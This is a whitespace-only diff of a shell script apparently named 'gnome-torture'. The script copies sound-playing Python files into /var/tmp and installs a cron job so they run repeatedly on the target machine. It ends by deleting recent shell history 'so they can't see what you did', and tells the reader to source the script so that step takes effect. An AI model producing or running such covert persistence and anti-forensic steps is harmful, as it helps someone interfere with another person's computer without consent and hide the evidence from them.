@@ -28,29 +28,19 @@ code_loc="/var/tmp/gnome-torture"
 # User must have python3 on their system
 
 python_loc=$(which python3)
-
 original_dir=$(pwd)
-
 gnome_dir=$(dirname "$0")
-
 cd "$gnome_dir"
 
 if [[ ! -d "$code_loc" ]]; then
-
     echo "creating directory $code_loc"
-
     mkdir "$code_loc"
-
     chmod +w "$code_loc"
-
     cp -t "$code_loc" "${gnome_dir}/gnome" "${gnome_dir}/mpg123.py" "${gnome_dir}/sound.py"
-
 fi
 
 # Make sure to see here that you don't add multiple of the identical corntabs, unless that's what you want
-
 # Type crontab -l to see all the current cron jobs, and type crontab -r to delete all cron jobs
-
 command="${python_loc} ${code_loc}/sound.py"
 
 (
@@ -59,7 +49,5 @@ command="${python_loc} ${code_loc}/sound.py"
 ) | crontab -
 
 # Clear the last few history commands so they can't see what you did
-
 # Because of this, you must run this script with ". run.sh" instead of "./run.sh"
-
 history -d -5--1
